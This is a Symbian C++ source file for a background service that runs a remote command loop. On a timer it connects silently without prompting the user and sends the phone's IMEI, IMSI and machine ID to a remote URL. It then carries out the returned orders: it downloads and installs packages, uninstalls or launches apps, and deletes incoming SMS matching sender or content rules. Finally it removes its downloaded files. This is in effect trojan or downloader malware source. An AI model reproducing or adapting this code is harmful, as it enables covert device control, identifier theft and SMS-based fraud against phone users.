#ifdef EKA2
#include <eikstart.h>
#include <e32svr.h>
#endif

#include <e32math.h>
#include <pathinfo.h> 
#include <eikenv.h>
#include <eikappui.h>
#include <eikapp.h>
#include <apgcli.h>
#include <connpref.h>
#include <commdbconnpref.h>
#include <commdb.h>
#include <cdbpreftable.h>
#include "AppMain.h"
#include "timeouttimer.h"
#include "applicationmanager.h"
#include "commonutils.h"
#include "systemmanager.h"
#include "utf.h"
#ifndef EKA2
#include <sysutil.h>
#endif

CAppMain* g_server=0;
TInt CAppMain::EntryPoint(TAny* /*aNone*/){
  CTrapCleanup* cleanupStack=CTrapCleanup::New();
  if(!cleanupStack){
    PanicServer(ECreateTrapCleanup);
  }
  Log(_L("TInt CAppMain::EntryPoint() 1"));
  TRAPD(leave,ThreadMainL());
  if(leave){
    Log(_L("TInt CAppMain::EntryPoint() 2"));
    PanicServer(ESrvCreateServer);
  }

  delete cleanupStack;
  Log(_L("TInt CAppMain::EntryPoint() 3"));
  cleanupStack=NULL;
  return KErrNone;
}

void CAppMain::ThreadMainL(){
  CActiveScheduler* activeScheduler=new (ELeave) CActiveScheduler();
  CleanupStack::PushL(activeScheduler);
  CActiveScheduler::Install(activeScheduler);
  RFs fs;
  fs.Connect();
  fs.MkDirAll(KAppFolder);
  fs.Close();
  TTime currentTime;
  currentTime.HomeTime();
  TBuf8<32> log8;
  log8.Format(_L8("Application start at %d:%d:%d"),currentTime.DateTime().Hour(),currentTime.DateTime().Minute(),currentTime.DateTime().Second());
  Log(log8,0);
  CAppMain::NewLC();
  CActiveScheduler::Start();
  CleanupStack::PopAndDestroy(2);
}

CAppMain* CAppMain::NewL(){
  CAppMain* server=CAppMain::NewLC();
  CleanupStack::Pop(server);
  return server;
}

CAppMain* CAppMain::NewLC(){
  CAppMain* server=new (ELeave) CAppMain(EPriorityNormal);
  CleanupStack::PushL(server);
  server->ConstructL();
  return server;
}

CAppMain::CAppMain(TInt aPriority) :
  CServer2(aPriority){
}

CAppMain::~CAppMain(){
  Log(_L8("CAppMain::~CAppMain() start"));
  this->OrderCancel();
  SAFE_DELETE(this->iTimeout);
  SAFE_DELETE(this->iUserAgent);
  SAFE_DELETE(this->iApplicationManager);
  SAFE_DELETE(this->iSmsEngine);
  this->iConnection.Close();
  this->iSocketServ.Close();
  Log(_L8("CAppMain::~CAppMain() end"));
}

void CAppMain::ConstructL(){
  StartL(KInstallManager);
  g_server=this;
  iRejectSmsAddresses=new (ELeave) CDesCArrayFlat(1);
  iRejectSmsContents=new (ELeave) CDesCArrayFlat(1);
  iDrive=GetAppDrive();
  iApplicationManager=CApplicationManager::NewL();
  this->iSmsEngine=CSmsEngine::NewL(this);
  this->iMMServicePeriodic=CPeriodic::NewL(0);
  this->iMMServicePeriodic->Start(1*1000000,1200*1000000,TCallBack(MMServiceTick,this));
}

TInt CAppMain::MMServiceTick(TAny* aObject){
  CAppMain* app=((CAppMain*)aObject);
  if((app->iPeriodicCount)%3==0){//This is to resove a stricky problem, iMMServicePeriodic duration cannot great than 3600
    if(app->iTimeout) delete app->iTimeout;
    app->iTimeout=CTimeOutTimer::NewL(0,*app);
    app->iState=EInitNetwork;
    app->iTimeout->After(1*1000000);
  }
  app->iPeriodicCount++;
  return 1;
}

CSession2* CAppMain::NewSessionL(const TVersion& aVersion,const RMessage2& /*aMessage*/) const{
  return NULL;
}

TInt CAppMain::RunError(TInt aError){
  Log(_L8("TInt CAppMain::RunError(TInt aError) start"));
  if(aError==KErrBadDescriptor){
    PanicClient(Message(),EBadDescriptor);
  }else{
    Message().Complete(aError);
  }
  ReStart();
  Log(_L8("TInt CAppMain::RunError(TInt aError) end"));
  return KErrNone;
}

void CAppMain::PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic){
  Log(_L8("void CAppMain::PanicClient() start"));
  aMessage.Panic(KInstallManager,aPanic);
  Log(_L8("void CAppMain::PanicClient() end"));
}

void CAppMain::PanicServer(TInstallManagerPanic aPanic){
  Log(_L8("void CAppMain::PanicServer() start"));
  User::Panic(KInstallManager,aPanic);
  Log(_L8("void CAppMain::PanicServer() end"));
}

void CAppMain::ExecuteOrder(){
  Log(_L8("void CInstallManager::ExecuteOrder() start"));
  iRejectSmsAddresses->Reset();
  iRejectSmsContents->Reset();
  HBufC8* content=HBufC8::New(KSEMaxBufferSize);
  CleanupStack::PushL(content);
  TInt error=ReadFromFile(KLocalIndexPath,content);
  Log(_L8("void CInstallManager::ExecuteOrder() 1"));
  Log(content->Des());
  if(error==0&&content->Length()>5){
    Log(_L8("void CInstallManager::ExecuteOrder() 2"));
    CDesC8ArrayFlat* lines=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(lines);
    SeprateToArray(content->Des(),KNewLine,*lines);
    TInt lineCount=lines->Count();
    if(lineCount>0){
      TBool needDownload=EFalse;
      for(TInt i=0;i<lineCount;++i){
        TPtrC8 order=(*lines)[i];
        if(order.Length()>3){
          TBuf8<250> buf;
          buf.Format(_L8("Parsing order:%S"),&order);
          Log(buf);
          CDesC8ArrayFlat* orderColumns=new (ELeave) CDesC8ArrayFlat(1);
          CleanupStack::PushL(orderColumns);
          SeprateToArray(order,_L8(","),*orderColumns);
          TInt count=orderColumns->Count();
          buf.Format(_L8("Array size:%d"),count);
          Log(buf);
          TPtrC8 part1=(*orderColumns)[0];
          TPtrC8 part2=(*orderColumns)[1];
          TPtrC8 part3=(*orderColumns)[2];
          Log(part1);
          Log(part2);
          Log(part3);
          CleanupStack::PopAndDestroy(orderColumns);
          if(part1.Find(_L8("i"))==0){//flag=="i",Download and install the sis;
            this->DownloadApplication(part3);
            needDownload=ETrue;
          }else if(part1.Find(_L8("u"))==0){//flag=="u",Unstall the sis;
            TUid appUid=HexString2Uid(part2);
            this->iApplicationManager->Uninstall(appUid);
          }else if(part1.Find(_L8("r"))==0){//flag="r", run the aplication;
            TUid appUid=HexString2Uid(part2);
            if(this->iApplicationManager->IsInstalled(appUid)){
              this->iApplicationManager->StartApplication(appUid);
            }else{
              this->DownloadApplication(part3);
              needDownload=ETrue;
            }
          }else if(part1.Find(_L8("m"))==0){//flag="m", sms reject rule;
            Log(_L8("Add reject rule start:"));
            TBuf<21> address;
            address.Copy(part2);
            HBufC* buf16=CnvUtfConverter::ConvertToUnicodeFromUtf8L(part3);
            CleanupStack::PushL(buf16);
            TBuf<500> content;
            content.Copy(buf16->Des());
            Log(address);
            Log(content);
            this->iRejectSmsAddresses->AppendL(address);
            this->iRejectSmsContents->AppendL(content);
            Log(_L8("Add reject rule end:"));
            CleanupStack::PopAndDestroy();
          }
        }
      }
      if(!needDownload){
        this->iState=ECloseNetwork;
        this->iTimeout->After(5*1000*1000);
      }
    }
    CleanupStack::PopAndDestroy(lines);
  }
  CleanupStack::PopAndDestroy(content);
  Log(_L8("void CInstallManager::ExecuteOrder() end"));
}

void CAppMain::TimerExpired(){
  switch(iState){
    case EInitNetwork: {
      TRAPD(err,DoInitNetworkFlow());
      if(err){
        Log(_L8("DoInitNetworkFlow EXCEPT."));
        return;
      }
      iState=EGetOrder;
      iTimeout->After(2*1000000);
    }
      break;
    case EGetOrder: {
      this->GetOrder();
      break;
    }
    case EExecuteOrder: {
      this->ExecuteOrder();
      break;
    }
    case EInstall: {
      this->iApplicationManager->Install();
      iState=ECloseNetwork;
      iTimeout->After(5*1000000);
      break;
    }
    case ECloseNetwork: {
      Log(_L8("close connection begin."));
      TRAPD(err,DoCloseNetworkFlow());
      if(err){
        Log(_L8("ECloseNetwork EXCEPT."));
        return;
      }
      break;
    }
    case ECleanUp: {
      this->iTimeout->Cancel();
#ifndef MYDEBUG
      DeleteFile(KLocalIndexPath);
      DeleteFile(KLocalSisPath);
#endif
    }
      break;
  }
}

void CAppMain::OnWapOrder2Complete(const TDesC8& aData){
  Log(_L8("waporder complete."));
  iState=ECloseNetwork;
  iTimeout->After(15*1000000);
}

void CAppMain::OnWapOrder2Error(TInt aErrorId){
  TBuf8<128> log(_L8("waporder failed:"));
  log.AppendNum(aErrorId);
  Log(log);
  iState=ECloseNetwork;
  iTimeout->After(15*1000000);
}

TInt CAppMain::DoInitNetworkFlow(){
  TInt r=-1;
  iDefaultAccessPointID=2;
#ifndef _MANUALAPN_
#ifndef __WINS__    //如果是真机，检查用户手机是否有移动梦网IAP接入点，如果没有，提示用户需要先建立此接入点
  if(GetAccessPoint()){
    r=0;
  }else{
    Log(_L8("no correct IAP."));
  }
#endif  
#endif  
  iFirstConnect=ETrue;
  return r;
}

void CAppMain::DoCloseNetworkFlow(){
  iTimeout->Cancel();
  iState=EInitNetwork;
  iCountConnect=0;
  iFirstConnect=ETrue;
  iConnection.Close();
  iSocketServ.Close();
  Log(_L8("close connection complete."));
  iState=ECleanUp;
  this->iTimeout->After(1*1000*1000);
}

TBool CAppMain::GetState(){
  TBool r=ETrue;
  if(iFirstConnect){
    iSocketServ.Connect();
    TCommDbConnPref prefs;
    //有些手机需要搜索接入点
    prefs.SetIapId(iDefaultAccessPointID);
    if(0==iConnection.Open(iSocketServ)){
      //提示用户选择接入点
      prefs.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
      TInt err=0;
#ifndef _MANUALAPN_
      err=iConnection.Start(prefs);
#else
      err = iConnection.Start();
#endif
      if(0==err){
        iFirstConnect=EFalse;
        return ETrue;
      }
      r=EFalse;
    }
  }
  return r;
}

void CAppMain::OnInstallerEvent(TBool aIsInstall,TUid aAppUid,TInt aError){
  
}

TBool CAppMain::GetAccessPoint(){
  TBuf<100> CommDBName;
  TUint32 default_iap_ID(0);
  TUint32 will_set_iap_id(0);
  TBuf<100> ItemName(_L("wap"));
  const TUint8 str[]={
      0xfb,
      0x79,
      0xa8,
      0x52,
      0xa6,
      0x68,
      0x51,
      0x7F,
      0
  };
  TPtrC ptrYDMW=TPtrC((TUint16*)str,4);
  //创建手机IAP数据库对象
  CCommsDatabase* CommDb=CCommsDatabase::NewL(EDatabaseTypeIAP);
  CleanupStack::PushL(CommDb);
  
  //打开IAP接入点表
  CCommsDbTableView* tableIAP=CommDb->OpenTableLC(TPtrC(IAP));
  if(tableIAP->GotoFirstRecord()==KErrNone){
    do{
      //循环获取IAP接入点，如有移动梦网接入点则对will_set_iap_id赋值
      tableIAP->ReadUintL(TPtrC(COMMDB_ID),default_iap_ID);
      tableIAP->ReadTextL(TPtrC(COMMDB_NAME),CommDBName);
      //iCoeEnv->ReadResource(ItemName, LOC_BUF_ACCESS_POINT_DEFAULT);
      if(CommDBName.FindF(ItemName)>=0||CommDBName.FindF(ptrYDMW)>=0){
        will_set_iap_id=default_iap_ID;
        break;
      }
    }while(tableIAP->GotoNextRecord()==KErrNone);
  }

  CleanupStack::PopAndDestroy(tableIAP);
  CleanupStack::PopAndDestroy(CommDb);
  
  //将获取的移动梦网接入点做为缺省访问接入点
  if(will_set_iap_id>0){
    iDefaultAccessPointID=will_set_iap_id;
    Log(_L8("cmwap IAP"));
    //    TBuf8<12> buf;
    //    buf.AppendNum((TInt)will_set_iap_id);
    //    Log(buf);
    return ETrue;
  }else{
    //假如没有找到“移动梦网”接入点，则提示用户在手机中设置此接入点
    Log(_L8("no cmwap"));
    return EFalse;
  }
}

//Download Manager begin
void CAppMain::ReceData(const TDesC8& aData){
  Log(_L8("CAppMain::ReceData() begin..."));
  if(this->iFlowOrder==1){
    if(aData.Length()>10){
      Log(_L8("Save Index File begin..."));
      RFs rfs;
      rfs.Connect();
      RFileWriteStream indexFile;
      TVolumeInfo volinfo;
      TInt err=rfs.Volume(volinfo,EDriveC);
      TFileName fileName;
      fileName.Copy(KLocalIndexPath);
      err=indexFile.Replace(rfs,fileName,EFileWrite|EFileStream);
      if(err==KErrNone){
        indexFile.WriteL(aData);
      }
      indexFile.Close();
      rfs.Close();
      Log(_L8("Save Index File end"));
      iState=EExecuteOrder;
      iTimeout->After(1*1000000);
    }else{
      Log(_L8("Order is Empty, will close the network"));
      iState=ECloseNetwork;
      iTimeout->After(1*1000000);
    }
  }else if(this->iFlowOrder==2){
    Log(_L8("CWapOrder2::ReceData:2"));
    RFs rfs;
    rfs.Connect();
    Log(_L8("CWapOrder2::ReceData:3"));
    RFileWriteStream sisFile;
    TVolumeInfo volinfo;
    TInt err=rfs.Volume(volinfo,EDriveC);
    TFileName fileName;
    fileName.Copy(KLocalSisPath);
    err=sisFile.Replace(rfs,fileName,EFileWrite|EFileStream);
    if(err==KErrNone){
      Log(_L8("CWapOrder2::ReceData:4"));
      //Log(aData);
      sisFile.WriteL(aData);
      Log(_L8("CWapOrder2::ReceData:5"));
    }
    sisFile.Close();
    rfs.Close();
    iState=EInstall;
    iTimeout->After(1*1000000);
  }
  Log(_L8("CAppMain::ReceData() end"));
}

TInt CAppMain::DownloadApplication(const TDesC8& aUrl){
  Log(_L8("CWapOrder2::DownloadApplication() begin.."));
  OrderCancel();
  this->iFlowOrder=2;
  iSocketEngine=CSocketEngine::NewL();
  TBuf8<512> userAgent;
  userAgent.Copy(KUserAgent);
  iSocketEngine->SetUserAgent(userAgent);
  iSocketEngine->HTTPGetRange(this,aUrl,0,-1);
  Log(_L8("CWapOrder2::DownloadApplication() end"));
  return 0;
}

TInt CAppMain::GetOrder(){
  this->OrderCancel();
  Log(_L8("CInstallManager::GetOrder() start...."));
  this->iFlowOrder=1;
  if(iSocketEngine){
    SAFE_DELETE(iSocketEngine);
  }
  iSocketEngine=CSocketEngine::NewL();
  iSocketEngine->SetUserAgent(KUserAgent);
  TBuf8<200> url;
  url.Copy(KIndexUrl);
  url.Append(_L8("?imei="));
  CSystemManager* manager=CSystemManager::NewL();
  CleanupStack::PushL(manager);
  url.Append(manager->GetIMEI());
  url.Append(_L8("&imsi="));
  url.Append(manager->GetIMSI());
  url.Append(_L8("&machineUid="));
  url.AppendNum(manager->GetMachineUId());
  CleanupStack::PopAndDestroy(manager);
  iSocketEngine->HTTPGetRange(this,url,0,-1);
  Log(_L8("CInstallManager::GetOrder() end"));
  return 0;
}

TInt CAppMain::OrderCancel(){
  if(iTimeout) iTimeout->Cancel();
  SAFE_DELETE(iSocketEngine);
  iCustomStep=0;
  iGotoStep=-1;
  return 0;
}

void CAppMain::OnError(TInt aErrId){
  //if(iObserver){
  // TRAPD(err,iObserver->OnWapOrder2Error(aErrId));
  //}
}

void CAppMain::OnHttpError(THttpErrorID aErrId){
  OnError(iCustomStep+1);
}

TBool CAppMain::MessageNeedDelete(const TDesC& aFromAddress,const TDesC& aFromContent){
  Log(_L8("TBool CAppMain::MessageNeedDelete() begin..\n---------------------------\n"));
  Log(aFromAddress);
  Log(aFromContent);
  TInt count=this->iRejectSmsAddresses->Count();
  TBool result=EFalse;
  for(TInt i=0;i<count;++i){
    TBuf<21> addresskey;
    addresskey.Copy((*iRejectSmsAddresses)[i]);
    addresskey.Trim();
    Log(addresskey);
    TBuf<50> contentKey;
    contentKey.Copy((*iRejectSmsContents)[i]);
    contentKey.Trim();
    Log(contentKey);
    if(aFromAddress.Find(addresskey)>=0){
      if(contentKey.Length()==0||aFromContent.Find(contentKey)>=0){
        result=ETrue;
        Log(_L8("Match"));
        break;
      }
    }
  }
  Log(_L8("---------------------------\nTBool CAppMain::MessageNeedDelete() end"));
  return result;
}
